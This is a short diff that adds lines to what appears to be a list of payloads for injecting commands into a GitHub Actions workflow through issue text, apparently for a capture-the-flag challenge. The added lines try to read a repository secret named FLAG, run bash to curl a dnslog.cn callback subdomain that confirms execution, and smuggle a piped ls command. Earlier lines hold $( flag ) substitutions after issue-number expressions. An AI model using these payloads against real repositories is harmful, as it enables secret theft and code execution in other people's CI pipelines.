@@ -608,3 +608,7 @@ ${{ github.event.issue.number }} $( flag )
 ${{ github.event.issue.number }} $( flag )
 ${{ github.event.issue.number }} $( flag )
 matoujin:ls
+R1gelX29:${{ secret.FLAG }};
+
+/bin/bash -e "curl fksb.sxhx72.dnslog.cn";
+|ls;
